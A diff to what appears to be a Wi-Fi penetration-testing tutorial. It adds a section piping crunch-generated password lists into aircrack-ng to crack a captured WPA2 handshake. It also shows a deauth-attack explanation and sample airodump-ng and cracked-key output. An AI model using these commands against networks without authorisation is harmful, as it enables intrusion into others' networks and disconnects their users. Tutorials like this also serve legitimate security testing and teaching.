@@ -162,32 +162,54 @@ If the password is cracked you will see a `KEY FOUND!` message in the terminal f
                          KEY FOUND! [ hacktheplanet ]
 
 
-      Master Key     : A1 90 16 62 6C B3 E2 DB BB D1 79 CB 75 D2 C7 89 
-                       59 4A C9 04 67 10 66 C5 97 83 7B C3 DA 6C 29 2E 
+      Master Key     : A1 90 16 62 6C B3 E2 DB BB D1 79 CB 75 D2 C7 89
+                       59 4A C9 04 67 10 66 C5 97 83 7B C3 DA 6C 29 2E
 
-      Transient Key  : CB 5A F8 CE 62 B2 1B F7 6F 50 C0 25 62 E9 5D 71 
-                       2F 1A 26 34 DD 9F 61 F7 68 85 CC BC 0F 88 88 73 
-                       6F CB 3F CC 06 0C 06 08 ED DF EC 3C D3 42 5D 78 
-                       8D EC 0C EA D2 BC 8A E2 D7 D3 A2 7F 9F 1A D3 21 
+      Transient Key  : CB 5A F8 CE 62 B2 1B F7 6F 50 C0 25 62 E9 5D 71
+                       2F 1A 26 34 DD 9F 61 F7 68 85 CC BC 0F 88 88 73
+                       6F CB 3F CC 06 0C 06 08 ED DF EC 3C D3 42 5D 78
+                       8D EC 0C EA D2 BC 8A E2 D7 D3 A2 7F 9F 1A D3 21
 
-      EAPOL HMAC     : 9F C6 51 57 D3 FA 99 11 9D 17 12 BA B6 DB 06 B4 
+      EAPOL HMAC     : 9F C6 51 57 D3 FA 99 11 9D 17 12 BA B6 DB 06 B4
 ```
+
+#### Cracking With Aircrack-ng combined with crunch
+
+Crunch is a tool to generate combinations of given string or pattern.We can use crunch to generate password list to avoid use of wordlist. Time required depends on your system configurations.
+
+Now, we need to install crunch
+```bash
+sudo apt-get install crunch
+```
+
+Now, use crunch with Aircrack-ng
+
+```bash
+# syntex 8 8 are min-length and max-length of password to generate
+# 01234567890 is set of elements to construct password
+# we can also use -t "@^%," to use pattern '@' - replaced with lowercase ',' - replaced with uppercase
+# '%' - replaced with numbers and '^' - is replaced with special chars
+# *************** don't forget '-' at the end
+crunch 8 8 0123456789 | aircrack-ng -a2 'PATH-TO-CAP-FILE'.cap  -b 58:98:35:CB:A2:77 -w -
+```
+
+Everything else is same as above just dictionary file is replaced with generated passwords.
 
 ## Deauth Attack
 
-A deauth attack sends forged deauthentication packets from your machine to a client connected to the network you are trying to crack. These packets include fake "sender" addresses that make them appear to the client as if they were sent from the access point themselves. Upon receipt of such packets, most clients disconnect from the network and immediately reconnect, providing you with a 4-way handshake if you are listening with `airodump-ng`. 
+A deauth attack sends forged deauthentication packets from your machine to a client connected to the network you are trying to crack. These packets include fake "sender" addresses that make them appear to the client as if they were sent from the access point themselves. Upon receipt of such packets, most clients disconnect from the network and immediately reconnect, providing you with a 4-way handshake if you are listening with `airodump-ng`.
 
 Use `airodump-ng` to monitor a specific access point (using `-c channel --bssid MAC`) until you see a client (`STATION`) connected. A connected client look something like this, where is `64:BC:0C:48:97:F7` the client MAC.
 
 ```
  CH  6 ][ Elapsed: 2 mins ][ 2017-07-23 19:15 ]                                         
-                                                                                                                                           
+
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
-                                                                                                                                           
+
  9C:5C:8E:C9:AB:C0  -19  75     1043      144   10   6  54e  WPA2 CCMP   PSK  ASUS                                                         
-                                                                                                                                           
+
  BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                 
-                                                                                                                                           
+
  9C:5C:8E:C9:AB:C0  64:BC:0C:48:97:F7  -37    1e- 1e     4     6479  ASUS
 ```
 
